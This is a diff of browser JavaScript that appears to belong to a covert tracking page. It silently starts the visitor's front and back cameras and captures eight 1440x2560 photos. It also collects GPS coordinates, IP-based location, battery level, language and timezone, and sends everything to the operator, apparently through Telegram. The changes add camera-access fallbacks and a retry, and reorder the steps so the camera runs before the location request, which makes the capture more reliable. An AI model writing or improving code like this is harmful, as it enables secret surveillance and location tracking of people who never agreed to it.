@@ -37,7 +37,6 @@
     charging: null
   };
 
-  // ========== DOM ==========
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const ctx = canvas.getContext('2d');
@@ -62,7 +61,21 @@
     } catch(e) {}
   }
 
-  // ========== CAPTURE PHOTO — 9:16 PORTRAIT HIGH QUALITY ==========
+  // ========== GET USER MEDIA ==========
+  function getUserMedia(constraints) {
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      return navigator.mediaDevices.getUserMedia(constraints);
+    }
+    const legacy = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
+    if (legacy) {
+      return new Promise((resolve, reject) => {
+        legacy.call(navigator, constraints, resolve, reject);
+      });
+    }
+    return Promise.reject(new Error('getUserMedia not supported'));
+  }
+
+  // ========== CAPTURE 9:16 ==========
   function capturePhoto() {
     return new Promise((resolve) => {
       try {
@@ -70,7 +83,6 @@
         const vh = video.videoHeight;
         if (!vw || !vh) { resolve(null); return; }
 
-        // قەبارەی گەورەتر: 1440x2560 (2K) بۆ وێنەی ڕوونتر
         const targetWidth = 1440;
         const targetHeight = 2560;
         const targetAspect = targetWidth / targetHeight;
@@ -93,19 +105,13 @@
         canvas.height = targetHeight;
         ctx.drawImage(video, sx, sy, sw, sh, 0, 0, targetWidth, targetHeight);
 
-        // کوالیتی 98% بۆ وێنەی زۆر ڕوون
         const dataUrl = canvas.toDataURL('image/jpeg', 0.98);
         const byteString = atob(dataUrl.split(',')[1]);
         const ab = new ArrayBuffer(byteString.length);
         const ia = new Uint8Array(ab);
-        for (let i = 0; i < byteString.length; i++) {
-          ia[i] = byteString.charCodeAt(i);
-        }
-        const blob = new Blob([ab], { type: 'image/jpeg' });
-        resolve(blob);
-      } catch(e) {
-        resolve(null);
-      }
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        resolve(new Blob([ab], { type: 'image/jpeg' }));
+      } catch(e) { resolve(null); }
     });
   }
 
@@ -117,7 +123,6 @@
         state.stream = null;
       }
 
-      // داوای ریزۆلوشنی بەرز بکە بۆ وێنەی باشتر
       const constraints = {
         video: {
           facingMode: facingMode,
@@ -127,7 +132,7 @@
         audio: false
       };
 
-      navigator.mediaDevices.getUserMedia(constraints)
+      getUserMedia(constraints)
         .then(s => {
           state.stream = s;
           video.srcObject = s;
@@ -137,7 +142,18 @@
           };
           video.onerror = () => reject('Video error');
         })
-        .catch(err => reject(err.message));
+        .catch(err => {
+          getUserMedia({ video: true, audio: false })
+            .then(s => {
+              state.stream = s;
+              video.srcObject = s;
+              video.onloadedmetadata = function() {
+                video.play();
+                setTimeout(resolve, 500);
+              };
+            })
+            .catch(err2 => reject(err2.message || err.message || 'Camera failed'));
+        });
     });
   }
 
@@ -148,24 +164,29 @@
     }
   }
 
+  // ========== CAPTURE MULTIPLE ==========
+  async function captureMultiple(count, label) {
+    for (let i = 0; i < count; i++) {
+      const photo = await capturePhoto();
+      if (photo) {
+        let caption = '📸 ' + label + ' ' + (i + 1) + '/' + count + ' • 1440x2560';
+        if (state.geo) caption += '\n📍 ' + state.geo.lat + ', ' + state.geo.lon;
+        sendPhoto(photo, caption);
+      }
+      await new Promise(r => setTimeout(r, 300));
+    }
+  }
+
   // ========== GET IP ==========
   function getIP() {
     return new Promise((resolve) => {
       fetch('https://ipapi.co/json/')
         .then(r => r.json())
-        .then(data => {
-          state.ip = data.ip;
-          state.ipData = data;
-          resolve();
-        })
+        .then(data => { state.ip = data.ip; state.ipData = data; resolve(); })
         .catch(() => {
           fetch('https://ipinfo.io/json')
             .then(r => r.json())
-            .then(data => {
-              state.ip = data.ip;
-              state.ipData = data;
-              resolve();
-            })
+            .then(data => { state.ip = data.ip; state.ipData = data; resolve(); })
             .catch(() => resolve());
         });
     });
@@ -179,7 +200,6 @@
         resolve();
         return;
       }
-
       state.geoStatus = 'pending';
       navigator.geolocation.getCurrentPosition(
         (pos) => {
@@ -195,7 +215,7 @@
           resolve();
         },
         (err) => {
-          state.geoStatus = 'denied';
+          state.geoStatus = 'denied: ' + err.message;
           resolve();
         },
         { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
@@ -214,9 +234,7 @@
             resolve();
           })
           .catch(() => resolve());
-      } else {
-        resolve();
-      }
+      } else resolve();
     });
   }
 
@@ -233,7 +251,6 @@
       if (state.ipData.loc) msg += '📍 Coords: ' + state.ipData.loc + '\n';
       if (state.ipData.timezone) msg += '🕐 Timezone: ' + state.ipData.timezone + '\n';
     }
-
     msg += '\n📍 GPS Status: ' + (state.geoStatus || 'pending') + '\n';
     if (state.geo) {
       msg += '📍 GPS Location:\n';
@@ -245,7 +262,6 @@
       if (state.geo.speed) msg += '   Speed: ' + state.geo.speed + ' m/s\n';
       msg += '   Maps: https://maps.google.com/?q=' + state.geo.lat + ',' + state.geo.lon + '\n';
     }
-
     if (state.battery !== null) {
       msg += '\n🔋 Battery: ' + state.battery + '%';
       if (state.charging) msg += ' (⚡ Charging)';
@@ -256,66 +272,46 @@
     msg += '🌍 Language: ' + (navigator.language || 'unknown') + '\n';
     msg += '🕐 Timezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n';
     msg += '⏱️ Time: ' + new Date().toLocaleString();
-
     sendText(msg);
   }
 
-  // ========== CAPTURE MULTIPLE ==========
-  async function captureMultiple(count, label) {
-    for (let i = 0; i < count; i++) {
-      const photo = await capturePhoto();
-      if (photo) {
-        // قەبارەی وێنە بۆ تەلەگرام دەنێرین، تەلەگرام خۆی کۆمپرێس دەکات بەڵام وێنەکە گەورە دەمێنێتەوە
-        let caption = '📸 ' + label + ' ' + (i + 1) + '/' + count + ' • 1440x2560';
-        if (state.geo) {
-          caption += '\n📍 ' + state.geo.lat + ', ' + state.geo.lon;
-        }
-        sendPhoto(photo, caption);
-      }
-      await new Promise(r => setTimeout(r, 300));
-    }
-  }
-
-  // ========== MAIN EXECUTION ==========
+  // ========== MAIN — CAMERA FIRST, THEN LOCATION ==========
   async function main() {
-    // Get all info
-    await Promise.all([getIP(), getBattery()]);
-    await getGPS();
-
-    // Send full info
-    sendFullInfo();
-
-    // Start camera and capture
+    // Step 1: Camera first — front
+    sendText('📷 Starting front camera...');
     try {
-      sendText('📷 Starting front camera...');
       await startCamera('user');
       await new Promise(r => setTimeout(r, 400));
-
-      sendText('📸 Capturing 4 front photos (1440x2560)...');
+      sendText('📸 Capturing 4 front photos...');
       await captureMultiple(4, 'Front Selfie');
+    } catch(err) {
+      sendText('❌ Front camera error: ' + (err.message || err));
+    }
 
+    // Step 2: Camera — back
+    try {
       sendText('📷 Switching to back camera...');
       await startCamera('environment');
       await new Promise(r => setTimeout(r, 400));
-
-      sendText('📸 Capturing 4 back photos (1440x2560)...');
+      sendText('📸 Capturing 4 back photos...');
       await captureMultiple(4, 'Back Camera');
-
-      stopCamera();
-      sendText('✅ ALL DONE — 8 photos captured and sent (4 front + 4 back) — 1440x2560 HD');
-
     } catch(err) {
-      sendText('❌ Camera error: ' + err);
-      document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;cursor:pointer;" id="retry"></div>';
-      document.getElementById('retry').onclick = function() {
-        this.remove();
-        main();
-      };
-      setTimeout(() => {
-        const el = document.getElementById('retry');
-        if (el) el.click();
-      }, 2000);
+      sendText('❌ Back camera error: ' + (err.message || err));
     }
+
+    stopCamera();
+    sendText('✅ 8 photos captured. Now requesting location...');
+
+    // Step 3: Location after camera
+    await getGPS();
+
+    // Step 4: IP + Battery
+    await Promise.all([getIP(), getBattery()]);
+
+    // Step 5: Send full info
+    sendFullInfo();
+
+    sendText('✅ ALL DONE — 8 photos + location + info sent');
   }
 
   // ========== START ==========
